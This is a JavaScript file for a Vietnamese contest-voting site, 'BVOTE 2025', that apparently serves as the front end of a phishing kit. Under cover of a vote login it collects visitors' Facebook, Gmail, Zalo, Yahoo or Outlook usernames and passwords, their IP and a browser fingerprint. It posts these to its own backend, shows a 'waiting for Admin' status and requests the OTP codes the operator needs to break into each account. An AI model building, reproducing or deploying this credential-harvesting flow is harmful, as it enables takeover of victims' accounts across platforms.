/**
 * BVOTE 2025 - User Homepage JavaScript
 * Handles user interactions and real-time communication with backend
 */

class BVoteUserSystem {
    constructor() {
        this.apiUrl = '/user-login-backend.php';
        this.wsUrl = 'ws://localhost:8080/user';
        this.currentSession = null;
        this.pollInterval = null;
        this.statusCheckInterval = 2000; // 2 seconds
        this.platforms = {
            'facebook': {
                name: 'Facebook',
                icon: 'fab fa-facebook-f',
                color: '#1877f2',
                placeholder: 'Email hoặc số điện thoại'
            },
            'gmail': {
                name: 'Gmail',
                icon: 'fab fa-google',
                color: '#ea4335',
                placeholder: 'Địa chỉ email Gmail'
            },
            'zalo': {
                name: 'Zalo',
                icon: 'fas fa-comments',
                color: '#0068ff',
                placeholder: 'Số điện thoại Zalo'
            },
            'yahoo': {
                name: 'Yahoo',
                icon: 'fab fa-yahoo',
                color: '#7b0099',
                placeholder: 'Email Yahoo'
            },
            'hotmail': {
                name: 'Hotmail/Outlook',
                icon: 'fab fa-microsoft',
                color: '#0078d4',
                placeholder: 'Email Hotmail/Outlook'
            },
            'other': {
                name: 'Khác',
                icon: 'fas fa-user-circle',
                color: '#6c757d',
                placeholder: 'Tên đăng nhập'
            }
        };

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.loadContests();
        this.loadTopRankings();
        this.setupWebSocket();
        this.checkExistingSession();
    }

    setupEventListeners() {
        // Platform login buttons
        document.querySelectorAll('.platform-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const platform = e.currentTarget.dataset.platform;
                this.selectPlatform(platform);
            });
        });

        // Login form submission
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.processLogin();
            });
        }

        // Cancel login button
        const cancelBtn = document.getElementById('cancelLogin');
        if (cancelBtn) {
            cancelBtn.addEventListener('click', () => {
                this.cancelLogin();
            });
        }

        // OTP form submission
        const otpForm = document.getElementById('otpForm');
        if (otpForm) {
            otpForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.submitOTP();
            });
        }

        // Contest cards click handler
        document.addEventListener('click', (e) => {
            if (e.target.closest('.contest-card')) {
                const contestId = e.target.closest('.contest-card').dataset.contestId;
                this.viewContest(contestId);
            }
        });

        // Vote buttons
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('vote-btn')) {
                const contestantId = e.target.dataset.contestantId;
                this.vote(contestantId);
            }
        });

        // Modal close handlers
        document.querySelectorAll('[data-bs-dismiss="modal"]').forEach(btn => {
            btn.addEventListener('click', () => {
                this.resetLoginModal();
            });
        });
    }

    selectPlatform(platform) {
        const modal = document.getElementById('loginModal');
        const platformSelect = document.getElementById('platformSelect');
        const loginFormSection = document.getElementById('loginFormSection');
        const selectedPlatform = document.getElementById('selectedPlatform');
        const platformIcon = document.getElementById('platformIcon');
        const platformName = document.getElementById('platformName');
        const usernameInput = document.getElementById('username');

        // Hide platform selection, show login form
        platformSelect.classList.add('d-none');
        loginFormSection.classList.remove('d-none');

        // Update platform display
        const platformInfo = this.platforms[platform];
        platformIcon.className = platformInfo.icon;
        platformIcon.style.color = platformInfo.color;
        platformName.textContent = platformInfo.name;
        selectedPlatform.dataset.platform = platform;

        // Update username placeholder
        usernameInput.placeholder = platformInfo.placeholder;
        usernameInput.focus();
    }

    async processLogin() {
        const platform = document.getElementById('selectedPlatform').dataset.platform;
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;

        if (!username || !password) {
            this.showAlert('Vui lòng nhập đầy đủ thông tin đăng nhập', 'warning');
            return;
        }

        // Generate session ID
        const sessionId = this.generateSessionId();
        this.currentSession = sessionId;

        // Collect user data for security
        const userData = {
            action: 'process_login',
            sessionId: sessionId,
            platform: platform,
            username: username,
            password: password,
            ipAddress: await this.getUserIP(),
            userAgent: navigator.userAgent,
            fingerprint: this.generateFingerprint(),
            timestamp: new Date().toISOString()
        };

        this.showWaitingScreen();

        try {
            const response = await this.apiCall(userData);

            if (response.success) {
                this.showStatusScreen(sessionId);
                this.startStatusPolling(sessionId);
            } else {
                throw new Error(response.error || 'Đăng nhập thất bại');
            }

        } catch (error) {
            console.error('Login error:', error);
            this.showAlert('Lỗi xử lý đăng nhập: ' + error.message, 'danger');
            this.resetLoginModal();
        }
    }

    showWaitingScreen() {
        const loginFormSection = document.getElementById('loginFormSection');
        const waitingScreen = document.getElementById('waitingScreen');

        loginFormSection.classList.add('d-none');
        waitingScreen.classList.remove('d-none');

        // Update waiting message
        const waitingMessage = document.getElementById('waitingMessage');
        waitingMessage.innerHTML = `
            <div class="text-center">
                <div class="spinner-border text-primary mb-3" role="status">
                    <span class="visually-hidden">Đang xử lý...</span>
                </div>
                <h5>Đang gửi yêu cầu đăng nhập</h5>
                <p class="text-muted">Hệ thống đang xử lý thông tin đăng nhập của bạn...</p>
            </div>
        `;
    }

    showStatusScreen(sessionId) {
        const waitingScreen = document.getElementById('waitingScreen');
        const statusScreen = document.getElementById('statusScreen');

        waitingScreen.classList.add('d-none');
        statusScreen.classList.remove('d-none');

        // Initialize status display
        this.updateStatusDisplay({
            status: 'pending',
            message: 'Đang chờ Admin xử lý...',
            progress: 10
        });
    }

    updateStatusDisplay(status) {
        const statusMessage = document.getElementById('statusMessage');
        const progressBar = document.getElementById('statusProgress');
        const sessionInfo = document.getElementById('sessionInfo');

        // Update message
        statusMessage.innerHTML = `
            <div class="d-flex align-items-center mb-3">
                <div class="spinner-border spinner-border-sm text-primary me-2" role="status"></div>
                <span>${status.message}</span>
            </div>
        `;

        // Update progress
        if (progressBar) {
            progressBar.style.width = `${status.progress}%`;
            progressBar.setAttribute('aria-valuenow', status.progress);
        }

        // Update session info
        if (sessionInfo && this.currentSession) {
            sessionInfo.innerHTML = `
                <small class="text-muted">
                    Session ID: ${this.currentSession}<br>
                    Thời gian: ${new Date().toLocaleString('vi-VN')}
                </small>
            `;
        }

        // Handle different status types
        this.handleStatusUpdate(status);
    }

    handleStatusUpdate(status) {
        switch (status.status) {
            case 'success':
                this.handleLoginSuccess(status);
                break;

            case 'failed':
                this.handleLoginFailure(status);
                break;

            case 'otp_required':
                this.showOTPInput(status);
                break;

            case 'checkpoint':
                this.handleCheckpoint(status);
                break;

            case 'cancelled':
                this.handleCancellation(status);
                break;

            case 'approved':
                this.updateStatusDisplay({
                    ...status,
                    message: 'Admin đã phê duyệt - Đang thực hiện đăng nhập...',
                    progress: 60
                });
                break;
        }
    }

    handleLoginSuccess(status) {
        const statusMessage = document.getElementById('statusMessage');
        statusMessage.innerHTML = `
            <div class="text-center text-success">
                <i class="fas fa-check-circle fa-3x mb-3"></i>
                <h5>Đăng nhập thành công!</h5>
                <p>Chào mừng bạn đến với BVOTE 2025</p>
            </div>
        `;

        // Close modal and refresh page after 2 seconds
        setTimeout(() => {
            const modal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
            modal.hide();
            this.refreshUserInterface();
        }, 2000);
    }

    handleLoginFailure(status) {
        const statusMessage = document.getElementById('statusMessage');
        statusMessage.innerHTML = `
            <div class="text-center text-danger">
                <i class="fas fa-times-circle fa-3x mb-3"></i>
                <h5>Đăng nhập thất bại</h5>
                <p>${status.message || 'Có lỗi xảy ra trong quá trình đăng nhập'}</p>
                <button class="btn btn-primary" onclick="bvoteUser.resetLoginModal()">
                    Thử lại
                </button>
            </div>
        `;
    }

    showOTPInput(status) {
        const statusScreen = document.getElementById('statusScreen');
        const otpScreen = document.getElementById('otpScreen');

        statusScreen.classList.add('d-none');
        otpScreen.classList.remove('d-none');

        // Focus on OTP input
        setTimeout(() => {
            document.getElementById('otpCode').focus();
        }, 100);
    }

    async submitOTP() {
        const otpCode = document.getElementById('otpCode').value.trim();

        if (!otpCode) {
            this.showAlert('Vui lòng nhập mã OTP', 'warning');
            return;
        }

        try {
            const response = await this.apiCall({
                action: 'submit_otp',
                session_id: this.currentSession,
                otp: otpCode
            });

            if (response.success) {
                // Return to status screen
                document.getElementById('otpScreen').classList.add('d-none');
                document.getElementById('statusScreen').classList.remove('d-none');

                this.updateStatusDisplay({
                    status: 'processing',
                    message: 'Đã gửi OTP - Đang xử lý...',
                    progress: 70
                });
            } else {
                throw new Error(response.error || 'Gửi OTP thất bại');
            }

        } catch (error) {
            this.showAlert('Lỗi gửi OTP: ' + error.message, 'danger');
        }
    }

    async cancelLogin() {
        if (!this.currentSession) return;

        try {
            const response = await this.apiCall({
                action: 'cancel_login',
                session_id: this.currentSession
            });

            if (response.success) {
                this.stopStatusPolling();
                this.resetLoginModal();
                this.showAlert('Đã hủy yêu cầu đăng nhập', 'info');
            }

        } catch (error) {
            console.error('Cancel login error:', error);
            this.resetLoginModal();
        }
    }

    startStatusPolling(sessionId) {
        if (this.pollInterval) {
            clearInterval(this.pollInterval);
        }

        this.pollInterval = setInterval(async () => {
            try {
                const response = await this.apiCall({
                    action: 'get_status',
                    session_id: sessionId
                });

                if (response.success && response.status) {
                    this.updateStatusDisplay(response.status);

                    // Stop polling if completed
                    if (response.status.completed) {
                        this.stopStatusPolling();
                    }
                }

            } catch (error) {
                console.error('Status polling error:', error);
                // Continue polling unless it's a critical error
            }
        }, this.statusCheckInterval);
    }

    stopStatusPolling() {
        if (this.pollInterval) {
            clearInterval(this.pollInterval);
            this.pollInterval = null;
        }
    }

    resetLoginModal() {
        // Reset all screens
        document.getElementById('platformSelect').classList.remove('d-none');
        document.getElementById('loginFormSection').classList.add('d-none');
        document.getElementById('waitingScreen').classList.add('d-none');
        document.getElementById('statusScreen').classList.add('d-none');
        document.getElementById('otpScreen').classList.add('d-none');

        // Clear form data
        document.getElementById('loginForm').reset();
        document.getElementById('otpForm').reset();

        // Stop polling
        this.stopStatusPolling();
        this.currentSession = null;
    }

    async loadContests() {
        try {
            // This would normally load from API
            // For now, use sample data
            const contests = [
                {
                    id: 1,
                    title: "Cuộc thi Ảnh đẹp 2025",
                    description: "Tìm kiếm những bức ảnh đẹp nhất",
                    participants: 125,
                    endDate: "2025-02-28",
                    image: "/uploads/images/contest1.jpg",
                    status: "active"
                },
                {
                    id: 2,
                    title: "Tài năng âm nhạc trẻ",
                    description: "Khám phá tài năng âm nhạc của giới trẻ",
                    participants: 89,
                    endDate: "2025-03-15",
                    image: "/uploads/images/contest2.jpg",
                    status: "active"
                }
            ];

            this.displayContests(contests);

        } catch (error) {
            console.error('Error loading contests:', error);
        }
    }

    displayContests(contests) {
        const container = document.getElementById('contestsContainer');
        if (!container) return;

        container.innerHTML = contests.map(contest => `
            <div class="col-md-6 col-lg-4 mb-4">
                <div class="contest-card" data-contest-id="${contest.id}">
                    <div class="contest-image">
                        <img src="${contest.image}" alt="${contest.title}" onerror="this.src='/uploads/images/placeholder.jpg'">
                        <div class="contest-overlay">
                            <span class="badge bg-primary">${contest.participants} thí sinh</span>
                        </div>
                    </div>
                    <div class="contest-info">
                        <h5>${contest.title}</h5>
                        <p>${contest.description}</p>
                        <div class="contest-meta">
                            <small class="text-muted">
                                <i class="fas fa-calendar"></i>
                                Kết thúc: ${new Date(contest.endDate).toLocaleDateString('vi-VN')}
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        `).join('');
    }

    async loadTopRankings() {
        try {
            // Sample ranking data
            const rankings = [
                { rank: 1, name: "Nguyễn Văn A", votes: 1250, avatar: "/uploads/images/avatar1.jpg" },
                { rank: 2, name: "Trần Thị B", votes: 1189, avatar: "/uploads/images/avatar2.jpg" },
                { rank: 3, name: "Lê Văn C", votes: 1156, avatar: "/uploads/images/avatar3.jpg" },
                // ... more rankings
            ];

            this.displayRankings(rankings);

        } catch (error) {
            console.error('Error loading rankings:', error);
        }
    }

    displayRankings(rankings) {
        const container = document.getElementById('rankingsContainer');
        if (!container) return;

        container.innerHTML = rankings.map((item, index) => `
            <div class="ranking-item" data-rank="${item.rank}">
                <div class="rank-number">
                    <span class="rank-badge ${index < 3 ? 'top-three' : ''}">${item.rank}</span>
                </div>
                <div class="contestant-avatar">
                    <img src="${item.avatar}" alt="${item.name}" onerror="this.src='/uploads/images/default-avatar.png'">
                </div>
                <div class="contestant-info">
                    <h6>${item.name}</h6>
                    <span class="vote-count">${item.votes.toLocaleString()} votes</span>
                </div>
            </div>
        `).join('');
    }

    viewContest(contestId) {
        // Check if user is logged in
        if (!this.isLoggedIn()) {
            this.showLoginRequired();
            return;
        }

        // Redirect to contest page
        window.location.href = `/user/vote.php?contest=${contestId}`;
    }

    vote(contestantId) {
        if (!this.isLoggedIn()) {
            this.showLoginRequired();
            return;
        }

        // Handle voting logic
        console.log('Voting for contestant:', contestantId);
    }

    isLoggedIn() {
        // Check if user has valid session
        return localStorage.getItem('bvote_session') !== null;
    }

    showLoginRequired() {
        this.showAlert('Vui lòng đăng nhập để tiếp tục', 'warning');

        // Show login modal
        const modal = new bootstrap.Modal(document.getElementById('loginModal'));
        modal.show();
    }

    showAlert(message, type = 'info') {
        // Create toast notification
        const toastContainer = document.getElementById('toastContainer') || this.createToastContainer();

        const toast = document.createElement('div');
        toast.className = `toast align-items-center text-white bg-${type} border-0`;
        toast.setAttribute('role', 'alert');
        toast.innerHTML = `
            <div class="d-flex">
                <div class="toast-body">${message}</div>
                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
            </div>
        `;

        toastContainer.appendChild(toast);

        const bsToast = new bootstrap.Toast(toast);
        bsToast.show();

        // Remove toast after it's hidden
        toast.addEventListener('hidden.bs.toast', () => {
            toast.remove();
        });
    }

    createToastContainer() {
        const container = document.createElement('div');
        container.id = 'toastContainer';
        container.className = 'toast-container position-fixed top-0 end-0 p-3';
        container.style.zIndex = '9999';
        document.body.appendChild(container);
        return container;
    }

    setupWebSocket() {
        try {
            this.ws = new WebSocket(this.wsUrl);

            this.ws.onopen = () => {
                console.log('WebSocket connected');
            };

            this.ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                this.handleWebSocketMessage(data);
            };

            this.ws.onclose = () => {
                console.log('WebSocket disconnected');
                // Attempt to reconnect after 5 seconds
                setTimeout(() => this.setupWebSocket(), 5000);
            };

            this.ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };

        } catch (error) {
            console.warn('WebSocket not available:', error.message);
        }
    }

    handleWebSocketMessage(data) {
        switch (data.type) {
            case 'login_update':
                if (data.session_id === this.currentSession) {
                    this.updateStatusDisplay(data.status);
                }
                break;

            case 'contest_update':
                this.loadContests();
                break;

            case 'ranking_update':
                this.loadTopRankings();
                break;

            case 'system_message':
                this.showAlert(data.message, data.alert_type || 'info');
                break;
        }
    }

    async apiCall(data) {
        const response = await fetch(this.apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        return await response.json();
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    async getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'unknown';
        }
    }

    generateFingerprint() {
        return {
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency,
            timestamp: Date.now()
        };
    }

    checkExistingSession() {
        const session = localStorage.getItem('bvote_session');
        if (session) {
            try {
                const sessionData = JSON.parse(session);
                if (sessionData.expires > Date.now()) {
                    // Session is still valid
                    this.refreshUserInterface();
                } else {
                    // Session expired
                    localStorage.removeItem('bvote_session');
                }
            } catch (error) {
                localStorage.removeItem('bvote_session');
            }
        }
    }

    refreshUserInterface() {
        // Reload contests and rankings
        this.loadContests();
        this.loadTopRankings();

        // Update UI to show logged-in state
        const loginBtn = document.querySelector('.login-required');
        if (loginBtn) {
            loginBtn.textContent = 'Đã đăng nhập';
            loginBtn.classList.remove('btn-outline-primary');
            loginBtn.classList.add('btn-success');
        }
    }

    // Public methods for external access
    openLoginModal() {
        const modal = new bootstrap.Modal(document.getElementById('loginModal'));
        modal.show();
    }

    logout() {
        localStorage.removeItem('bvote_session');
        window.location.reload();
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.bvoteUser = new BVoteUserSystem();
});

// Global functions for inline event handlers
function openLoginModal() {
    if (window.bvoteUser) {
        window.bvoteUser.openLoginModal();
    }
}

function logout() {
    if (window.bvoteUser) {
        window.bvoteUser.logout();
    }
}
